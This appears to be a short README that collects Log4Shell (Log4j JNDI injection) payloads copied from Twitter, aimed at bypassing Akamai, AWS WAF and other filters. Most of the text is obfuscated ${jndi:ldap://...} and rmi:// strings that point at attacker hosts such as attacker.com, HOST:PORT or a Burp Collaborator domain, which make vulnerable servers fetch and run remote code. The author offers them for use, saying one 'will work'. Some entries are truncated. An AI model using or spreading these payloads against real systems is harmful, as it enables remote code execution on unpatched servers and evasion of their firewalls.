# log4j bypass payloads

Note these are copied from twitter, Can't mention authors or researchers individually. All I want to say Thank you very much.

#### Akamai Bypass Log4j
${jndi${123%25ff:-}:ldap://HOST:PORT/a}

#### Amazon AWS WAf Bypass

${j${k8s:k5:-ND}i${sd:k5:-:}ldap://HOST:PORT/a}

### Other bypass payloads


${lower:${:a:d:-${lower:}}jndi:}
${jndi:ldap://attacker.com/a}
${j${upper:${lower:n}}di:ldap://attacker.com/a}
${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:ldap://attacker.com/a}
${${env:BARFOO:-j}Ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1:1389/ass}
${${::-j}ndi:rmi://127.0.0.1:1389/ass}
${jndi:rmi://a.b.c}
${${lower:jndi}:${lower:rmi}://q.w.e/poc}
${${lower:${lower:jndi}}:${lower:rmi}://a.s.d/poc}
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://l}
${${::-j}ndi:rmi://}
${${lower:jndi}:${lower:rmi}://}
${${lower:${lower:jndi}}:${lower:rmi}://
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}:}
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
${jndi:rmi://adsasd.asdasd.asdasd}
${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
${j${upper:n:-}di:ldap://example.com:1389
${j${k8s:k5:-ND}i${sd:k5:-:}ldap://kjhkjhkjh}
${j${main:\k5:-Nd}i${spring:k5:-:}ldap://kjhkjhkjh}
${j${sys:k5:-nD}${lower:i${web:k5:-:}}ldap://kjhkjhkjh}
${j${::-nD}i${::-:}ldap://kjhkjhkjh}
${j${EnV:K5:-nD}i:ldap://kjhkjhkjh}
${j${loWer:Nd}i${uPper::}ldap}
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:l}dap${env:NaN:-:}//your.burpcollaborator.net/a}
${${upper:}jndi:ldap://example.com/a}
${j${upper::-n}di:ldap://example.com:1389/a}
${"£$_"£:a:d:-${lower:j}n}di:
${:a:d:-${lower:}j}ndi:
${:a:d:-${lower:j}n}di:

I am sure one of them will work.
[My twitter](https://twitter.com/Chirag99Artani)
Thank You!
